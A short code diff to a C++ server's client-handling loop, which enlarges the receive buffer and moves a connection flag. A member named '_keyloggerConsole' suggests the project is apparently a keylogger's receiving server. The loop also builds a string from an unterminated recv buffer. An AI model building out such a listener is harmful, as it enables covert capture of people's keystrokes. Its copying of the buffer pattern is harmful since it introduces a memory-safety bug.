@@ -76,11 +76,12 @@ int Server::listener()
 int Server::threadingClient()
 {
 	std::cout << "Client connected!\n";
-	gotConnection = true;
+	
 
-	char chunk[200];
+	char chunk[1024];
 	while (recv(client, chunk, sizeof(chunk), 0))
 	{
+		gotConnection = true;
 		std::string str(chunk);
 		AnswerFromClient answer(str, _keyloggerConsole);
 	}
